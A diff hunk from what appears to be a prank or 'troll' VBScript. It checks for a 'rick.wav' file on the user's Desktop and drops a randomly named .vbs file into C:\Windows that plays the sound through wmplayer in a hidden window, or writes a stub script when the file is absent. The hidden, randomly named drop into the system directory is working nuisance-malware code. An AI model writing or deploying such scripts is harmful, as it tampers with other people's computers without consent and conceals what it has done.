@@ -235,14 +235,26 @@ Set objFSO=CreateObject("Scripting.FileSystemObject")
 Dim file5
 file5 = RandomString()
 
-outFile="C:\Windows\" & file5 & ".vbs"
-Set objFile = objFSO.CreateTextFile(outFile,True)
+path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")
+trollSound = path & "\Desktop\rick.wav"
 
-objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
-objFile.Write "music = " & chr(34) & "%USERPROFILE%\Desktop\rick.wav" & chr(34) & "" & vbCrLf
-ObjFile.Write "WshShell.Run " & chr(34) & "wmplayer " & chr(34) & chr(34) & chr(34) & " & music & " & chr(34) & chr(34) & chr(34) & chr(34) & ",0,True" & vbCrLf
+If (objFSO.FileExists(trollSound)) Then
+    outFile="C:\Windows\" & file5 & ".vbs"
+    Set objFile = objFSO.CreateTextFile(outFile,True)
 
-objFile.Close
+    objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
+    objFile.Write "music = " & chr(34) & "%USERPROFILE%\Desktop\rick.wav" & chr(34) & "" & vbCrLf
+    objFile.Write "WshShell.Run " & chr(34) & "wmplayer " & chr(34) & chr(34) & chr(34) & " & music & " & chr(34) & chr(34) & chr(34) & chr(34) & ",0,True" & vbCrLf
+
+    objFile.Close 
+Else
+    outFile="C:\Windows\" & file5 & ".vbs"
+    Set objFile = objFSO.CreateTextFile(outFile,True)
+
+    objFile.Write "set WshShell = WScript.CreateObject("& chr(34) & "WScript.Shell" & chr(34) & ")" & vbCrLf
+
+    objFile.Close
+End IF
 
 '========================'
 '========================'
